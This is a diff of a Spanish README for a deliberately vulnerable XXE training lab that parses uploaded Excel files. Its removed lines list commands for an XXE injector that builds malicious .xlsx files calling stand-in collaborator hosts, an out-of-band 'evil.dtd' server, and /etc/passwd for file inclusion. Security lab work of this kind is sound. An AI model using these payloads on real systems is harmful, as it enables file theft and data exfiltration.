@@ -4,7 +4,6 @@
 
 Esta aplicación web ha sido diseñada específicamente para demostrar vulnerabilidades XXE (XML External Entity) en el contexto del procesamiento de archivos Excel (.xlsx). Es perfecta para:
 
-- Laboratorios de TryHackMe
 - Práctica de penetration testing
 - Educación en ciberseguridad
 - Pruebas de herramientas de XXE injection
@@ -51,8 +50,8 @@ xxe_lab_app/
 
 1. **Clonar/Copiar los archivos:**
    ```bash
-   # Los archivos ya están creados en tu sistema
-   cd /Users/jesusespinoza/xxe_lab_app
+   
+   cd xxe_lab_app
    ```
 
 2. **Configurar servidor web local:**
@@ -82,55 +81,11 @@ sudo chown -R www-data:www-data /var/www/html/xxe-lab/
 sudo chmod 755 /var/www/html/xxe-lab/uploads /var/www/html/xxe-lab/logs
 ```
 
-## 🧪 Cómo Usar el Laboratorio
-
-### Paso 1: Generar Archivo Excel Base
-```bash
-# Usar el script incluido para crear un Excel de prueba
-python3 /Users/jesusespinoza/create_test_excel.py
-```
-
-### Paso 2: Inyectar Payload XXE
-```bash
-# Usar el XXE Excel Injector
-python3 /Users/jesusespinoza/xxe_excel_injector.py \
-  -i test_input.xlsx \
-  -o malicious.xlsx \
-  -u http://YOUR-COLLABORATOR-DOMAIN.com
-```
-
-### Paso 3: Probar la Vulnerabilidad
+### Paso 1: Probar la Vulnerabilidad
 1. Abrir la aplicación web
 2. Subir el archivo `malicious.xlsx`
 3. Observar los resultados y indicadores XXE
 4. Verificar logs/requests en tu servidor colaborator
-
-## 🎯 Tipos de Payloads XXE para Probar
-
-### 1. HTTP Request (Burp Collaborator)
-```bash
-python3 xxe_excel_injector.py -i input.xlsx -o http_test.xlsx \
-  -u http://abc123.burpcollaborator.net
-```
-
-### 2. File Inclusion
-```bash
-python3 xxe_excel_injector.py -i input.xlsx -o file_test.xlsx \
-  -u /etc/passwd -t file
-```
-
-### 3. Different Target Files
-```bash
-# Apuntar a sheet1.xml en lugar de workbook.xml
-python3 xxe_excel_injector.py -i input.xlsx -o sheet_test.xlsx \
-  -u http://collaborator.com -f xl/worksheets/sheet1.xml
-```
-
-### 4. Out-of-Band (OOB)
-```bash
-python3 xxe_excel_injector.py -i input.xlsx -o oob_test.xlsx \
-  -u http://your-server.com/evil.dtd -t oob
-```
 
 ## 🔍 Análisis de Resultados
 
@@ -228,7 +183,6 @@ sudo yum install php-xml php-zip
 
 ### Herramientas Relacionadas
 - Burp Suite (Collaborator)
-- XXE Injector (incluido en este paquete)
 - Wireshark (para análisis de red)
 - tcpdump (para captura de tráfico)
 
